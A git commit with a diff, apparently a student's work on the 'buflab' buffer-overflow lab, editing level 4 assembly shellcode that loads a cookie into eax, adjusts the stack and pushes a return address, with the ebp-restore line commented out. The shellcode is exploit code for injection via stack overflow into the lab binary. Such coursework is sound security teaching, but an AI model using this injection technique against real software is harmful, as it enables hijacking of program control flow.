aee1c0c832f558b0296763de5ec778144d583b59
Won Wook SONG <wsong0512@gmail.com>
2015-03-24 01:06:21 +0900

    almost done 4/5

--- buflab-handout/level4assembly.s
+++ buflab-handout/level4assembly.s
@@ -1,5 +1,5 @@
 mov $0x238d4669, %eax #move cookie value to eax
-leal 0x30e8 (%esp), %ebp #restore ebp
+#leal 0x30e8 (%esp), %ebp #restore ebp
 sub $0x4, %esp #move esp so that it resutnr to itself upon ret
 movl $0x8048e6e, (%esp) #copy return address to memory
 ret
